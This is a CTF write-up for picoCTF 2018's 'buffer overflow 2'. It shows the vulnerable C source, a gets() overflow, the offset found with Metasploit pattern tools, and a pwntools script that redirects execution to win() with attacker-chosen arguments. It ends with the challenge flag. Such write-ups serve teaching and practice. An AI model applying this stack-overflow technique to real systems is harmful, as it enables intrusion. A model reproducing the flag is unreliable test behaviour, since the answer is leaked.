# buffer overflow 2
**Points: 250**

## Binary Exploitatioin

## Question
>Alright, this time you'll need to control some arguments. Can you get the flag from this program? You can find it in /problems/buffer-overflow-2_3_02aff35ae94896082cad513865e6c2eb on the shell server. Source. 

### Hint
>Try using gdb to print out the stack once you write to it!

## Solution
Let's check the source:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xDEADC0DE)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
We need to redirect the _eip_ to win() passing as arguments _0xDEADBEEF_ and _0xDEADC0DE_
- We need to get the padding len, for that i use msf-pattern:
```
# msf-pattern_create -l 150
# msf-pattern_offset -q 0x64413764
[*] Exact match at offset 112
```
- Now we can develoap our exploit: `padding + win_dir + 4 nops + _0xDEADBEEF_ + _0xDEADC0DE_`
```python
#!/usr/bin/python3

from pwn import *
from getpass import getpass

vuln = ELF('vuln')
win = p32(vuln.symbols[b'win'])
padding = ('A' * 112).encode('utf-8')
arg1 = p32(0xDEADBEEF)
arg2 = p32(0xDEADC0DE)

payload = padding + win + asm('nop')*4 + arg1 + arg2

s = ssh(host='2018shell4.picoctf.com',user=input('[+] SSH username: '),password=getpass('[+] SSH password: '))
r = s.run('cd /problems/buffer-overflow-2_3_02aff35ae94896082cad513865e6c2eb; ./vuln')

r.recv()
r.sendline(payload)
r.recv()
print(r.recv().decode('utf-8'))

s.close()
```

![alt text](https://github.com/manulqwerty/picoCTF-2018-WriteUp/blob/master/Binary%20Exploitation/buffer%20overflow%202/images/1.png)

### Flag
`picoCTF{addr3ss3s_ar3_3asya4104c14}`
